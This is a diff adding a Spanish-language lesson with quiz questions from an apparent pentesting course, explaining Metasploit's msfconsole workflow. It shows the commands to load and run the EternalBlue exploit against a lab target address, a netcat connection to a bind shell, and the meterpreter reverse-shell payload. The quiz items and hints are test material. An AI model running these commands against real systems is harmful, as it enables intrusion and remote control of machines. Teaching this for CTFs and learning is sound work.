@@ -1,0 +1,56 @@
+---
+index: 2
+title: "Metasploit: el arsenal organizado"
+questions:
+  - id: explotacion-basica-t02-q01
+    prompt: "¿Qué comando de msfconsole SELECCIONA el módulo que vas a usar?"
+    hint: "Tres letras: use exploit/..."
+    kind: text
+  - id: explotacion-basica-t02-q02
+    prompt: "¿Qué comando de Metasploit lista los parámetros configurables del módulo?"
+    hint: " show options."
+    kind: text
+  - id: explotacion-basica-t02-q03
+    prompt: "¿Qué es un payload en Metasploit?"
+    hint: "Lo que dejas DENTRO tras explotar."
+    kind: choice
+    options:
+      - id: a
+        label: "El escáner de puertos"
+      - id: b
+        label: "El código que se ejecuta en la víctima tras la explotación (ej. una shell)"
+      - id: c
+        label: "El informe del pentest"
+      - id: d
+        label: "Un plugin del navegador"
+---
+
+## msfconsole en cinco comandos
+
+Metasploit NO hace magia: es un marco que ORGANIZA exploits y payloads públicos
+(más de 2000 módulos) con una interfaz común.
+
+```text
+msf6> search eternalblue            # buscar por nombre/CVE
+msf6> use exploit/windows/smb/ms17_010_eternalblue
+msf6> show options                   # ¿qué me falta configurar?
+msf6> set RHOSTS 10.10.10.40        # el objetivo
+msf6> set LHOST 10.10.14.5          # MI ip (para la shell inversa)
+msf6> run
+```
+
+## Payloads: bind vs reverse
+
+- **Bind**: la víctima abre un puerto y esperas (`nc victima 4444`).
+- **Reverse**: LA VÍCTIMA te llama a ti (ideal contra firewalls que filtran
+  entrantes). `windows/x64/meterpreter/reverse_tcp` es el clásico.
+
+**Meterpreter** es el payload estrella: shell con memoria, migración de procesos,
+keylogger, descarga de archivos… y huella mínima.
+
+## Contexto honesto
+
+En CTFs y aprendizaje, Metasploit acelera muchísimo. En pentests reales muchos
+equipos lo evitan en fases delicadas (ruidoso, detectado por EDRs) y prefieren
+exploits manuales. Dominarás ambos: aquí lo usamos para ENTENDER el flujo
+explotación→payload→sesión, que es idéntico a mano.
